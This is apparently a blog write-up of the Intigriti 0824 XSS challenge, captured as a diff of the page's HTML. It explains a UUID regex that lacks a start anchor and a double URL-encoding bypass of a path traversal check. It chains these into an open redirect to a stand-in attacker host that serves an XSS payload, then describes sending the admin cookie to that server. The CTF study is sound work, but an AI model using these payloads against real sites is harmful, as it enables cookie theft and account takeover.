<strong>isValidUUID()</strong> function, we can see that it validates UUIDs using a regular expression.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>function</span> isValidUUID(noteId) {
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>const</span> uuidRegex <span style=color:#ff79c6>=</span>
-</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i</span>;
-</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> uuidRegex.test(noteId);
-</span></span><span style=display:flex><span>    }</span></span></code></pre></div></div><p>Here the Regex <code>[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$</code> only ensures that the UUID pattern appears at the end of the string. <strong>So there can be any prefix to this uuid , that means we can give ../../ before the uuid .</strong></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>../82652102-973d-429d-82e0-245a4fbfd6cb </span></span></code></pre></div></div><p>To ensure that it was a proper UUID the regex should have included a <code>^</code>
-in the beginnning like this.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i</span></span></code></pre></div></div><p>So we can do CSPT to the /contact endpoint like this.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>/view?note=../../../contact?return=http://attack&amp;82652102-973d-429d-82e0-245a4fbfd6cb</span></span></code></pre></div></div><p>However ../ was still <strong>blocked !!!</strong></p><h3 class="relative group">Bypassing the Path traversal check<div id=bypassing-the-path-traversal-check class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#bypassing-the-path-traversal-check aria-label=Anchor>#</a></span></h3><p>Upon looking closer, you can see that after the noteId is being checked, it is URL-decoded within the fetch function.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#ff79c6>if</span> (noteId.includes(<span style=color:#f1fa8c>&#34;../&#34;</span>)) {
-</span></span><span style=display:flex><span>            showFlashMessage(<span style=color:#f1fa8c>&#34;Input not allowed!&#34;</span>, <span style=color:#f1fa8c>&#34;danger&#34;</span>);
-</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span>;
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>        fetch(<span style=color:#f1fa8c>&#34;/api/notes/fetch/&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>decodeURIComponent</span>(noteId), {
-</span></span><span style=display:flex><span>            method<span style=color:#ff79c6>:</span> <span style=color:#f1fa8c>&#34;GET&#34;</span>,
-</span></span><span style=display:flex><span>            headers<span style=color:#ff79c6>:</span> {
-</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;X-CSRFToken&#34;</span><span style=color:#ff79c6>:</span> csrf_token,
-</span></span><span style=display:flex><span>            },
-</span></span><span style=display:flex><span>        })</span></span></code></pre></div></div><p>So we can easily bypass this check by just double urlencoding the noteId.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>view=..%252F..%252F..%252Fcontact?return=http://attacker&amp;UUID</span></span></code></pre></div></div><p>So during the <strong>noteId.includes("../")</strong> check, the noteId will be <strong>..%2F..%2Fcontact</strong>, so the check will return <strong>false</strong>. However, when fetch() is called, noteId gets URL-decoded with decodeURIComponent(noteId), turning it into <strong>../../../contact</strong>.</p><h2 class="relative group">🚀 Final Payloads<div id=--final-payloads class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#--final-payloads aria-label=Anchor>#</a></span></h2><p>Now that we&rsquo;ve bypassed both security checks, let&rsquo;s combine everything together.</p><ul><li><strong>Regex Bypass</strong>: By using ../../../ as a prefix to the UUID, we can bypass the regex validation.</li><li><strong>Path Traversal Check Bypass</strong>: Double URL encoding the payload allows us to bypass the path traversal check.</li></ul><p>With these steps, we can direct the fetch request to /contacts, which will <strong>trigger an Open Redirect to our attacker&rsquo;s server</strong>. The server responds with JSON containing a debug key with the XSS payload. This payload is then inserted into the outerHTML, leading to XSS.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>..%252F..%252F..%252Fcontact?return=https://attacker/exp.json%26e447f4e1-f7c9-439c-8378-b65b83189b60</span></span></code></pre></div></div><p>On the attacker’s server, we need to return a JSON object with the key debug and our XSS payload as the value.</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{ <span style=color:#ff79c6>&#34;debug&#34;</span>: <span style=color:#f1fa8c>&#34;&lt;img src=x onerror=alert()&gt;&#34;</span>} // for simple alert</span></span></code></pre></div></div><h2 class="relative group">💀 Exploit !!<div id=-exploit- class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#-exploit- aria-label=Anchor>#</a></span></h2><p><strong>Finally It works!!</strong></p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=image src=https://hackmd.io/_uploads/BkxpOBjqR.png></figure></p><p>To obtain the flag stored in the admin&rsquo;s cookie, we can simply access <strong>document.cookie</strong> within the XSS payload. Once we have the cookie, we can send it to our server and solve the challenge.</p></div></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_posts/intigriti-0824.md data-oid-likes=likes_posts/intigriti-0824.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span class="flex flex-col"><a class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/posts/intigriti-0724/><span class=leading-6><span class="inline-block rtl:rotate-180">&larr;</span>&ensp;Intigriti 0724 XSS Challenge
-</span></a><span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2024-06-06T21:00:26+05:30>June 6, 2024</time>
-</span></span><span class="flex flex-col items-end"><a class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/posts/backdoor/><span class=leading-6>XSLeaks Backdoor CTF&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
-</span></a><span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2025-01-19T21:26:29+05:30>January 19, 2025</time></span></span></div></div></footer></article><div id=scroll-to-top class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200"><a href=#the-top class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
-2026</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=http://example.org/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
-<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="false"><head>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>Intigriti 0824 XSS Challenge &middot; Alfins Notes</title>
+    <meta name="title" content="Intigriti 0824 XSS Challenge &middot; Alfins Notes">
+  
+
+  
+  
+    <meta name="description" content="N9O | Nuno Coração">
+  
+  
+  
+  
+  <link rel="canonical" href="http://localhost/posts/intigriti-0824/">
+  
+
+  
+  
+  
+
+  
+  <meta property="og:url" content="http://localhost/posts/intigriti-0824/">
+  <meta property="og:site_name" content="Alfins Notes">
+  <meta property="og:title" content="Intigriti 0824 XSS Challenge">
+  <meta property="og:description" content="tl;dr
+Bypassing CSPT filters and UUID validations implemented using Regex . Chaining CSPT and Open-Redirect to achieve XSS . Finally XSS and retrive the admin cookie .">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-05T10:17:19+05:30">
+    <meta property="article:modified_time" content="2025-01-05T10:17:19+05:30">
+    <meta property="og:image" content="http://localhost/posts/intigriti-0824/featured.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost/posts/intigriti-0824/featured.png">
+  <meta name="twitter:title" content="Intigriti 0824 XSS Challenge">
+  <meta name="twitter:description" content="tl;dr
+Bypassing CSPT filters and UUID validations implemented using Regex . Chaining CSPT and Open-Redirect to achieve XSS . Finally XSS and retrive the admin cookie .">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8e7b3fadb972b8f016af16c069a6940753d0c78d183f804f9da31b6ea0bf0a1c42989d9a3bb4aa9e05102618334fddd54efcf223e750d30b2ef2b8f9bf3f2ebf.css"
+    integrity="sha512-jns/rblyuPAWrxbAaaaUB1PQx40YP4BPnaMbbqC/ChxCmJ2aO7SqngUQJhgzT93VTvzyI&#43;dQ0wsu8rj5vz8uvw==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.712c423dd585dfd031bf75a70aad3af4b3de24c6eec1fef682d92724b4026b842cf843c8535587e5096039348125c57ff1bea2d46b2b4af8124673ca085880c4.js"
+      integrity="sha512-cSxCPdWF39Axv3WnCq069LPeJMbuwf72gtknJLQCa4Qs&#43;EPIU1WH5QlgOTSBJcV/8b6i1GsrSvgSRnPKCFiAxA=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "Intigriti 0824 XSS Challenge",
+    "headline": "Intigriti 0824 XSS Challenge",
+    
+    "inLanguage": "en",
+    "url" : "http://localhost/posts/intigriti-0824/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-01-05T10:17:19\u002b05:30",
+    "datePublished": "2025-01-05T10:17:19\u002b05:30",
+    
+    "dateModified": "2025-01-05T10:17:19\u002b05:30",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1237"
+  }]
+  </script>
+
+
+
+  
+  
+    
+
+
+
+
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+  
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      Alfins Notes
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="posts"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="Blog"
+      title="">
+      
+      
+        <span class="text-base font-medium break-normal">
+          Blog
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <a
+      href="about"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="About"
+      title="">
+      
+      
+        <span class="text-base font-medium break-normal">
+          About
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <div class="flex items-center">
+      <button
+        id="appearance-switcher"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base bf-icon-color-hover">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    </div>
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <button
+      id="appearance-switcher-mobile"
+      type="button"
+      aria-label="Dark mode switcher"
+      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
+      <div class="dark:hidden">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+      </div>
+      <div class="hidden dark:block">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+      </div>
+    </button>
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="posts"
+        aria-label="Blog"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="" class="text-2xl font-bold tracking-tight">
+          Blog
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="about"
+        aria-label="About"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="" class="text-2xl font-bold tracking-tight">
+          About
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+
+
+
+  
+    
+    
+      
+      
+    
+  
+
+
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+    
+    <img
+      id="background-image"
+      src="/posts/intigriti-0824/featured_hu_111aa7bef55481bc.png"
+      role="presentation"
+      loading="eager"
+      decoding="async"
+      fetchpriority="high"
+      class="absolute inset-0 w-full h-full object-cover"
+      >
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js"
+      integrity="sha512-AKV8c&#43;oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ&#43;pkPSYl5ixQYmehaQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/posts/intigriti-0824/featured_hu_111aa7bef55481bc.png"></script>
+  
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Intigriti 0824 XSS Challenge
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
